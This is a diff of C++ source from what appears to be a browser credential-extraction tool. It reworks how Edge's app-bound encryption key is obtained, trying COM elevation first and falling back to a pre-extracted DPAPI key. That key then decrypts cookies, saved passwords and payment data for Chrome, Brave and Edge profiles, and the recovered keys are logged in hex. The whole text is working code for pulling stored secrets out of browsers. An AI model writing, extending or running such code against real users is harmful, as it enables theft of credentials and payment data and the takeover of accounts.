@@ -32,35 +32,40 @@ namespace SecurityComponents
         std::vector<uint8_t> comKey, dpapiKey;
         fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
         
-        // Edge requires split-key strategy: different keys for different data types
-        if (browserConfig.name == "Edge") 
+        // Edge: try COM first (app_bound_encrypted_key — modern APPB cookies & passwords),
+        // fall back to pre-extracted DPAPI key if COM is unavailable.
+        if (browserConfig.name == "Edge")
         {
-            m_logger->Log("[*] Initializing split-phase strategy for Edge");
-            
-            // Phase 1: COM elevation for cookies and payment data
-            try {
-                m_logger->Log("[*] Phase 1: COM extraction (cookies/payments)");
-                MasterKeyDecryptor comDecryptor(*m_logger);
-                comKey = comDecryptor.Decrypt(browserConfig, localStatePath, DataType::Cookies);
-                m_logger->Log("[+] COM key acquired: " + Utils::BytesToHexString(comKey));
-            } catch (const std::exception& e) {
-                m_logger->Log("[-] COM key acquisition failed: " + std::string(e.what()));
-                throw;
-            }
-            
-            // Phase 2: Use pre-decrypted DPAPI key from orchestrator for passwords
-            if (!m_edgeDpapiKey.empty())
+            bool comOk = false;
+            try
             {
-                m_logger->Log("[*] Phase 2: Using pre-decrypted DPAPI key from orchestrator");
-                dpapiKey = m_edgeDpapiKey;
-                m_logger->Log("[+] DPAPI key ready: " + Utils::BytesToHexString(dpapiKey));
-            }
-            else
-            {
-                m_logger->Log("[-] No DPAPI key available - Edge passwords will not be extracted");
+                m_logger->Log("[*] Attempting COM key strategy for Edge");
+                MasterKeyDecryptor keyDecryptor(*m_logger);
+                comKey = keyDecryptor.Decrypt(browserConfig, localStatePath, DataType::All);
                 dpapiKey = comKey;
+                m_logger->Log("[+] Edge COM key obtained: " + Utils::BytesToHexString(comKey));
+                comOk = true;
             }
-        } 
+            catch (const std::exception& e)
+            {
+                m_logger->Log("[!] Edge COM key failed: " + std::string(e.what()));
+            }
+
+            if (!comOk)
+            {
+                if (!m_edgeDpapiKey.empty())
+                {
+                    comKey  = m_edgeDpapiKey;
+                    dpapiKey = m_edgeDpapiKey;
+                    m_logger->Log("[*] Falling back to DPAPI key: " + Utils::BytesToHexString(comKey));
+                }
+                else
+                {
+                    m_logger->Log("[-] No key available for Edge - extraction skipped");
+                    return;
+                }
+            }
+        }
         else 
         {
             // Chrome/Brave use single COM-elevated key for all data types
@@ -83,17 +88,9 @@ namespace SecurityComponents
             
             for (const auto& dataConfig : Data::GetExtractionConfigs()) 
             {
-                // Select appropriate key based on data type and browser
+                // All data types use comKey (Edge and Chrome/Brave both use COM/APPB)
                 const std::vector<uint8_t>* extractionKey = &comKey;
-                std::string keyType = "COM";
-                
-                if (browserConfig.name == "Edge" && dataConfig.outputFileName == "passwords") 
-                {
-                    extractionKey = &dpapiKey;
-                    keyType = "DPAPI";
-                }
-                
-                m_logger->Log("[*] Using " + keyType + " key for " + dataConfig.outputFileName + " extraction");
+                m_logger->Log("[*] Using COM key for " + dataConfig.outputFileName + " extraction");
                 
                 try {
                     DataExtractor extractor(profilePath, dataConfig, *extractionKey, *m_logger, 
